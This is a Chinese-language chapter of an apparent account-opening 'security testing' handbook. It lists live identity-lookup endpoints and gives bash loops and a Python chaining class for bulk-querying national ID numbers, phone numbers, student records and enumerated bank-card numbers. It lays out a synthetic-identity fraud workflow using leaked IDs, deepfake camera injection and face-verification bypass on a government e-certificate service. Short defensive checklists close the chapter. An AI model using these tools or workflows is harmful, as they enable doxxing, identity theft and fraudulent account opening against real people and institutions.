## 17. 身份信息查询API攻击面

> 身份信息查询API是开户安全测试中**身份信息收集**和**合成身份构建**的关键基础设施。
> 通过调用公开/半公开的身份信息查询接口，攻击者可以验证合成身份的真实性、
> 收集目标身份信息、逆向身份验证逻辑。本节整合了6条核心身份查询API、
> 2个政府服务自动化脚本以及完整的API链式调用方法论。

### 17.1 Companion Tools

| 工具/脚本 | 文件 | 用途 |
|-----------|------|------|
| 广西公安电子证件客户端 | [tools/guangxi_police_cert.py](../../tools/account-opening/guangxi_police_cert.py) | 自动化广西公安电子证件申请与下载 |
| 上海健康证查询 | [tools/shanghai_health_card.py](../../tools/account-opening/shanghai_health_card.py) | 上海健康证信息查询 |
| 江西学籍查询 | API: `http://hpmod.xin/api/sgk/江西学籍.php?msg=身份证` | 江西学籍信息查询 |
| 银行卡反模糊位 | API: `http://hpmod.xin/api/sgk/卡反模糊位.php?card=银行卡号` | 银行卡号模糊匹配/反查 |
| IP定位 | API: `http://hpmod.xin/api/sgk/ip定位.php?ip=IP` | IP地址地理定位 |
| 国政模糊常用号 | API: `http://hpmod.xin/api/sgk/国政模糊常用号.php?name=姓名&sfz=身份证` | 模糊查询常用号码 |
| 单次二要素 | API: `http://hpmod.xin/api/sgk/单次二要素.php?xm=姓名&sfz=身份证` | 姓名+身份证二要素验证 |
| 综合查询 | API: `http://ysjk.6kai.cc/zh2.php?cx=内容` | 综合信息查询 |

### 17.2 API端点详解

#### 17.2.1 江西学籍查询

```bash
# === 江西学籍信息查询 ===
# 端点: http://hpmod.xin/api/sgk/江西学籍.php
# 参数: msg=身份证号
# 用途: 查询江西省学籍信息，验证身份真实性

# 基本查询
curl "http://hpmod.xin/api/sgk/江西学籍.php?msg=<IDCARD-REDACTED>"

# 批量查询（配合身份证号生成器）
for id in $(cat id_list.txt); do
  curl -s "http://hpmod.xin/api/sgk/江西学籍.php?msg=$id" >> jx_xueji_results.txt
  sleep 1
done

# 攻击场景:
# 1. 验证合成身份的真伪 — 学籍数据与身份证信息交叉验证
# 2. 获取真实学籍信息用于社保/教育相关开户流程
# 3. 映射真实身份与合成身份的关系
# 4. 通过学籍信息中的家庭住址获取更多社工信息
```

#### 17.2.2 银行卡反模糊位

```bash
# === 银行卡号反模糊查询 ===
# 端点: http://hpmod.xin/api/sgk/卡反模糊位.php
# 参数: card=银行卡号(完整或部分)
# 用途: 模糊匹配银行卡号，获取卡号信息

# 基本查询
curl "http://hpmod.xin/api/sgk/卡反模糊位.php?card=6222021234567890"

# 批量查询（配合银行卡号生成器）
for prefix in 622202 622848 621700 622262 622700; do
  for i in $(seq 0 9999); do
    card_no="${prefix}$(printf '%012d' $i)"
    curl -s "http://hpmod.xin/api/sgk/卡反模糊位.php?card=$card_no" >> bank_results.txt
  done
done

# 攻击场景:
# 1. 银行卡四要素验证中的"银行卡号"获取
# 2. 探测银行卡号段归属（发卡行/卡类型）
# 3. 配合二要素验证生成完整身份信息
# 4. 开户流程中银行卡绑定环节的绕过测试
# 5. 测试开户系统是否仅校验银行卡号格式而不校验真实性
```

#### 17.2.3 IP定位

```bash
# === IP地址地理定位 ===
# 端点: http://hpmod.xin/api/sgk/ip定位.php
# 参数: ip=IP地址
# 用途: 获取IP地址的地理位置信息

# 基本查询
curl "http://hpmod.xin/api/sgk/ip定位.php?ip=8.8.8.8"
curl "http://hpmod.xin/api/sgk/ip定位.php?ip=114.114.114.114"

# 批量查询
for ip in $(cat ip_list.txt); do
  curl -s "http://hpmod.xin/api/sgk/ip定位.php?ip=$ip" >> geo_results.txt
done

# 攻击场景:
# 1. 开户风控绕过 — 模拟开户时IP地址与身份证地址在同一城市
# 2. 代理IP验证 — 检测代理IP的地理位置是否匹配目标区域
# 3. 社会工程 — 结合IP定位信息进行精准钓鱼
# 4. 合规测试 — 测试开户系统是否验证IP归属地与身份证地址一致性
# 5. 设备指纹伪造 — 在虚拟环境中伪造与身份匹配的IP地理位置
```

#### 17.2.4 国政模糊常用号

```bash
# === 国政数据模糊查询常用号码 ===
# 端点: http://hpmod.xin/api/sgk/国政模糊常用号.php
# 参数: name=姓名&sfz=身份证
# 用途: 模糊查询与姓名+身份证关联的常用号码（手机号等）

# 基本查询
curl "http://hpmod.xin/api/sgk/国政模糊常用号.php?name=张三&sfz=<IDCARD-REDACTED>"

# 批量查询
while IFS= read -r line; do
  name=$(echo $line | cut -d',' -f1)
  sfz=$(echo $line | cut -d',' -f2)
  curl -s "http://hpmod.xin/api/sgk/国政模糊常用号.php?name=$name&sfz=$sfz" >> phone_results.txt
  sleep 0.5
done < name_id_pairs.txt

# 攻击场景:
# 1. 获取目标手机号 — 用于开户流程中的手机号验证
# 2. 验证合成身份 — 检查生成的身份证号是否关联到真实手机号
# 3. 四要素验证准备 — 收集姓名+身份证+手机号+银行卡的四要素数据
# 4. 社交工程 — 获取目标常用号码用于短信钓鱼
# 5. 批量注册 — 配合接码平台验证手机号是否已被注册
```

#### 17.2.5 单次二要素

```bash
# === 单次二要素验证 ===
# 端点: http://hpmod.xin/api/sgk/单次二要素.php
# 参数: xm=姓名&sfz=身份证
# 用途: 验证姓名+身份证号二要素是否匹配（权威数据源）

# 基本查询
curl "http://hpmod.xin/api/sgk/单次二要素.php?xm=张三&sfz=<IDCARD-REDACTED>"

# 批量验证
while IFS= read -r line; do
  name=$(echo $line | cut -d',' -f1)
  sfz=$(echo $line | cut -d',' -f2)
  result=$(curl -s "http://hpmod.xin/api/sgk/单次二要素.php?xm=$name&sfz=$sfz")
  echo "$name,$sfz,$result" >> verification_results.txt
done < test_identities.txt

# 攻击场景:
# 1. 合成身份验证 — 检查生成的身份证号+姓名是否真实匹配
# 2. 身份信息清洗 — 从数据泄露中筛选出真实有效的身份组合
# 3. 开户系统对比测试 — 测试目标开户系统的二要素验证是否与权威数据一致
# 4. 批量生成合法身份 — 通过二要素接口验证生成的身份证号实用性
# 5. 评估二要素验证接口的速率限制和防滥用机制
```

#### 17.2.6 综合查询

```bash
# === 综合信息查询 ===
# 端点: http://ysjk.6kai.cc/zh2.php
# 参数: cx=查询内容（身份证号/手机号/姓名等）
# 用途: 综合信息查询，涵盖多种数据源

# 基本查询
curl "http://ysjk.6kai.cc/zh2.php?cx=<IDCARD-REDACTED>"
curl "http://ysjk.6kai.cc/zh2.php?cx=张三"
curl "http://ysjk.6kai.cc/zh2.php?cx=<PHONE-REDACTED>"

# 批量查询
for query in $(cat query_list.txt); do
  curl -s "http://ysjk.6kai.cc/zh2.php?cx=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$query'))")" >> zh_results.txt
  sleep 1
done
```

### 17.3 广西公安电子证件自动化脚本

> 该脚本实现了广西公安电子证件的全自动化申请流程，包括实名认证绕过、
> 人脸验证跳过、短信验证码OCR识别、电子证件下载与账户注销。
> 可作为开户安全测试中"身份验证流程绕过"的实战案例。

```python
# === 广西公安电子证件客户端关键功能 ===
# 文件: tools/account-opening/guangxi_police_cert.py

# 核心功能模块:
# 1. 用户身份核验 (check_user)
# 2. 实名认证绕过 — 跳过腾讯云人脸验证 (get_verifyid_for_register)
# 3. 社交登录 — 微信小程序登录模拟 (social_login)
# 4. 图形验证码OCR自动识别 (ocr_captcha)
# 5. 短信验证码发送 (send_sms_code)
# 6. 用户注册 — 包含手机号+实名绑定 (register_user)
# 7. 电子证件申请/下载 (check_certificate/download_certificate)
# 8. 账户注销 — 注册→使用→注销 完整生命周期 (cancel_account)

# 攻击面分析:
# 1. 实名认证绕过 — 利用验证ID获取接口跳过人脸识别
# 2. 批量注册 — 使用不同身份证号批量注册
# 3. 证件下载 — 获取真实电子证件用于KYC绕过
# 4. 账户注销 — 实现"注册→使用→注销→重新注册"循环

# 一键运行:
# python3 tools/account-opening/guangxi_police_cert.py
# 输入姓名和身份证号即可自动完成整个流程
```

### 17.4 上海健康证查询脚本

> 该脚本实现上海健康证(jkz.sh.cn)的在线查询，需要先逆向前端加密算法。
> 健康证包含姓名、身份证号、联系电话、照片等敏感信息，
> 可用于开户安全测试中的身份信息收集。

```python
# === 上海健康证查询客户端关键功能 ===
# 文件: tools/account-opening/shanghai_health_card.py

# 核心功能模块:
# 1. 验证码获取 (get_captcha)
# 2. 健康证查询 (query_health_card)
# 3. 结果格式化输出 (format_print)

# 攻击面分析:
# 1. 健康证信息泄露 — 姓名+身份证号+联系电话+照片
# 2. 健康证照片可被用于KYC人脸识别绕过
# 3. 联系电话可用于接码平台验证
# 4. 健康证编号可用于某些医疗类平台的开户
```

### 17.5 API链式调用与组合攻击

```python
# === 身份信息查询API链式调用 ===
# 将多条API组合使用，形成完整的信息收集链

import requests
import json
import time
import random

class IdentityQueryAPIChain:
    """身份信息查询API链式调用框架"""
    
    def __init__(self):
        self.base_urls = {
            "jx_xueji": "http://hpmod.xin/api/sgk/江西学籍.php",
            "bank_card": "http://hpmod.xin/api/sgk/卡反模糊位.php",
            "ip_location": "http://hpmod.xin/api/sgk/ip定位.php",
            "guozheng_phone": "http://hpmod.xin/api/sgk/国政模糊常用号.php",
            "two_factor": "http://hpmod.xin/api/sgk/单次二要素.php",
            "zhonghe": "http://ysjk.6kai.cc/zh2.php",
        }
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
    
    def query_jx_xueji(self, id_card):
        """查询江西学籍"""
        try:
            resp = self.session.get(
                self.base_urls["jx_xueji"],
                params={"msg": id_card},
                timeout=15
            )
            return resp.json() if resp.status_code == 200 else None
        except Exception as e:
            print(f"[jx_xueji] Error: {e}")
            return None
    
    def query_bank_card(self, card_no):
        """银行卡反模糊查询"""
        try:
            resp = self.session.get(
                self.base_urls["bank_card"],
                params={"card": card_no},
                timeout=15
            )
            return resp.json() if resp.status_code == 200 else None
        except Exception as e:
            print(f"[bank_card] Error: {e}")
            return None
    
    def query_ip_location(self, ip):
        """IP定位查询"""
        try:
            resp = self.session.get(
                self.base_urls["ip_location"],
                params={"ip": ip},
                timeout=15
            )
            return resp.json() if resp.status_code == 200 else None
        except Exception as e:
            print(f"[ip_location] Error: {e}")
            return None
    
    def query_guozheng_phone(self, name, id_card):
        """国政模糊查询常用号码"""
        try:
            resp = self.session.get(
                self.base_urls["guozheng_phone"],
                params={"name": name, "sfz": id_card},
                timeout=15
            )
            return resp.json() if resp.status_code == 200 else None
        except Exception as e:
            print(f"[guozheng_phone] Error: {e}")
            return None
    
    def verify_two_factor(self, name, id_card):
        """二要素验证"""
        try:
            resp = self.session.get(
                self.base_urls["two_factor"],
                params={"xm": name, "sfz": id_card},
                timeout=15
            )
            return resp.json() if resp.status_code == 200 else None
        except Exception as e:
            print(f"[two_factor] Error: {e}")
            return None
    
    def query_zhonghe(self, query):
        """综合查询"""
        try:
            resp = self.session.get(
                self.base_urls["zhonghe"],
                params={"cx": query},
                timeout=15
            )
            return resp.json() if resp.status_code == 200 else None
        except Exception as e:
            print(f"[zhonghe] Error: {e}")
            return None
    
    def full_identity_chain(self, name, id_card, ip=None):
        """完整身份信息链式查询"""
        results = {}
        
        # 步骤1: 二要素验证（验证身份真实性）
        print("[*] 步骤1: 二要素验证...")
        v2 = self.verify_two_factor(name, id_card)
        results["two_factor"] = v2
        if v2 and v2.get("status") == "match":
            print("[+] 二要素验证通过 - 身份真实")
        else:
            print("[-] 二要素验证失败 - 身份可能不真实")
        
        # 步骤2: 查询关联手机号
        print("[*] 步骤2: 查询关联手机号...")
        phone = self.query_guozheng_phone(name, id_card)
        results["phone"] = phone
        
        # 步骤3: 查询学籍信息
        print("[*] 步骤3: 查询学籍信息...")
        xueji = self.query_jx_xueji(id_card)
        results["xueji"] = xueji
        
        # 步骤4: IP定位（如果提供IP）
        if ip:
            print("[*] 步骤4: IP定位...")
            geo = self.query_ip_location(ip)
            results["geo"] = geo
        
        # 步骤5: 综合查询
        print("[*] 步骤5: 综合查询...")
        zh = self.query_zhonghe(id_card)
        results["zhonghe"] = zh
        
        return results
    
    def batch_identity_validation(self, identity_list, max_workers=5):
        """批量身份验证"""
        import concurrent.futures
        
        def validate_single(identity):
            """验证单个身份"""
            name = identity.get("name")
            id_card = identity.get("id_card")
            if not name or not id_card:
                return {"identity": identity, "valid": False, "error": "missing fields"}
            
            try:
                v2 = self.verify_two_factor(name, id_card)
                phone = self.query_guozheng_phone(name, id_card)
                return {
                    "identity": identity,
                    "valid": bool(v2 and v2.get("status") == "match"),
                    "two_factor": v2,
                    "phone": phone
                }
            except Exception as e:
                return {"identity": identity, "valid": False, "error": str(e)}
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            results = list(executor.map(validate_single, identity_list))
        
        # 筛选有效的身份
        valid_identities = [r for r in results if r.get("valid")]
        print(f"[+] 有效身份: {len(valid_identities)}/{len(identity_list)}")
        return results


# === 使用示例 ===
if __name__ == "__main__":
    chain = IdentityQueryAPIChain()
    
    # 单身份链式查询
    result = chain.full_identity_chain(
        name="张三",
        id_card="<IDCARD-REDACTED>",
        ip="114.114.114.114"
    )
    print(json.dumps(result, ensure_ascii=False, indent=2))
    
    # 批量身份验证
    identities = [
        {"name": "张三", "id_card": "<IDCARD-REDACTED>"},
        {"name": "李四", "id_card": "<IDCARD-REDACTED>"},
        {"name": "王五", "id_card": "<IDCARD-REDACTED>"},
    ]
    batch_results = chain.batch_identity_validation(identities)
```

### 17.6 身份信息查询API在开户攻击中的实战应用

#### 17.6.1 合成身份构建工作流

```
身份信息查询API → 合成身份构建 → 开户系统提交 → 成功开户

阶段1: 数据收集
  1. 从数据泄露/社工库获取一批身份证号
  2. 使用二要素API验证哪些身份证号有效
  3. 使用国政模糊查询获取关联手机号
  4. 使用学籍查询获取教育背景信息

阶段2: 身份合成
  1. 真实身份证号 + 虚构姓名（不在黑名单中）
  2. AI生成的人脸照片（StyleGAN3）
  3. 通过IP定位API选择与身份证地址一致的IP
  4. 虚拟手机号（接码平台）

阶段3: 开户提交
  1. 使用反检测浏览器模拟开户
  2. 虚拟摄像头注入预录制视频
  3. OCR结果篡改提交伪造身份
  4. 银行卡信息使用银行卡反模糊API验证

阶段4: 验证通过
  1. 二要素验证通过（身份证号真实）
  2. 手机号可接收验证码
  3. 人脸识别通过（Deepfake注入）
  4. 银行卡绑定通过（卡号格式正确）
```

#### 17.6.2 开户风控规则探测

```python
# === 使用身份查询API探测开户风控规则 ===

def probe_risk_rules(target_api, test_identities):
    """
    通过批量测试不同身份组合，探测开户系统的风控规则
    
    测试维度:
    - 同一身份证号+不同手机号 → 是否允许重复注册
    - 同一手机号+不同身份证号 → 是否允许
    - 同一IP+不同身份 → 有无频率限制
    - 不同IP+同一身份 → 是否触发异地登录风控
    - 虚拟运营商号段 → 是否被拦截
    - 国外IP → 是否被限制
    """
    results = []
    for identity in test_identities:
        result = {
            "identity": identity,
            "ip_location": self.query_ip_location(identity["ip"]),
            "two_factor_valid": self.verify_two_factor(identity["name"], identity["id_card"]),
            "registration_result": self.attempt_registration(target_api, identity),
        }
        # 分析风控规则
        if result["registration_result"].get("success"):
            result["risk_rule"] = "PASSED"
        elif "phone" in str(result["registration_result"]):
            result["risk_rule"] = "PHONE_BLOCKED"
        elif "ip" in str(result["registration_result"]):
            result["risk_rule"] = "IP_BLOCKED"
        elif "face" in str(result["registration_result"]):
            result["risk_rule"] = "FACE_LIVENESS_BLOCKED"
        else:
            result["risk_rule"] = "UNKNOWN"
        results.append(result)
    return results
```

#### 17.6.3 身份信息溯源与反查

```python
# === 身份信息溯源 ===
# 场景: 已知目标手机号/银行卡号，反查身份信息

def reverse_lookup(phone=None, bank_card=None, ip=None):
    """身份信息反查"""
    chain = IdentityQueryAPIChain()
    results = {}
    
    # 1. 手机号反查
    if phone:
        # 使用综合查询API反查手机号关联的身份信息
        zh = chain.query_zhonghe(phone)
        results["phone_lookup"] = zh
    
    # 2. 银行卡号反查
    if bank_card:
        # 使用银行卡反模糊API查询银行卡信息
        bank = chain.query_bank_card(bank_card)
        results["bank_lookup"] = bank
    
    # 3. IP溯源
    if ip:
        # 使用IP定位API查询地理位置
        geo = chain.query_ip_location(ip)
        results["geo_lookup"] = geo
    
    return results
```

### 17.7 安全测试检查点

```markdown
□ [ ] 身份信息查询API:
  □ [ ] 测试二要素验证接口的速率限制
  □ [ ] 测试国政模糊查询接口的防滥用机制
  □ [ ] 测试银行卡反模糊接口的卡号段覆盖范围
  □ [ ] 测试IP定位接口的精度和时延
  □ [ ] 测试综合查询接口的参数注入漏洞
  □ [ ] 测试API接口的认证/授权机制

□ [ ] 政府服务自动化脚本:
  □ [ ] 测试电子证件申请流程的身份验证强度
  □ [ ] 测试人脸识别绕过是否可被检测
  □ [ ] 测试OCR验证码识别是否可被防御
  □ [ ] 测试批量注册是否存在频率限制
  □ [ ] 测试账户注销后数据是否彻底清除

□ [ ] 合成身份检测:
  □ [ ] 是否检测二要素验证结果的时间一致性
  □ [ ] 是否检测身份证号对应的手机号归属地
  □ [ ] 是否交叉验证多个数据源的身份信息
  □ [ ] 是否检测IP地址与身份证地址的合理性
  □ [ ] 是否建立身份信息使用的历史基线
```

### 17.8 2026年身份查询API攻击趋势

```python
# === 2026年身份信息查询API攻击新趋势 ===

# 1. API聚合平台
# 2026年出现大量身份信息查询API聚合平台
# 类似hpmod.xin/ysjk.6kai.cc的代理API越来越多
# 攻击者: 利用聚合API批量查询，获取360°身份信息
# 防御: 检测API调用模式，识别批量查询行为

# 2. AI辅助身份信息关联
# 使用LLM自动关联多个API查询结果
# 构建完整的身份信息图谱
# 识别跨平台身份复用

# 3. 实时身份验证API
# 越来越多的开户系统接入实时身份验证API
# 攻击面: 中间人攻击篡改验证结果
# 攻击面: API降级攻击（实时→离线）
# 攻击面: 并发验证绕过（竞态条件）

# 4. 合成身份生命周期管理
# 2026年黑产使用自动化工具管理合成身份
# 创建→验证→休眠→使用→废弃 全生命周期
# 身份查询API用于验证阶段
# 防御: 检测身份信息的异常使用模式

# 5. 跨平台身份关联检测
# 同一身份信息在多个平台的使用
# 开户系统应检测: 
# - 同一身份证号在不同平台的开户记录
# - 同一手机号在不同平台的注册记录
# - 同一设备指纹的开户行为
# 攻击者: 使用不同的身份信息组合避免关联
```

### 17.9 防御建议

```markdown
1. 身份查询API保护:
   - 实施严格的速率限制（每IP/每分钟不超过N次查询）
   - 实施API Key认证机制
   - 检测异常查询模式（批量查询/高频查询）
   - 对查询结果进行脱敏处理

2. 开户系统防御:
   - 不要仅依赖二要素验证
   - 实施多源交叉验证（多个数据源对比）
   - 检测查询时间窗口（短时间内大量查询=风险信号）
   - 建立身份信息使用历史基线
   - 对异常身份信息组合进行标记

3. 风控规则:
   - 同一身份证号短时间内在不同平台开户 → 风险标记
   - 同一手机号绑定多个身份证号 → 风险标记
   - 使用虚拟运营商号段 → 加强验证
   - IP地址与身份证地址跨省/跨国 → 加强验证
   - 身份信息查询API调用频率异常 → 风控升级
```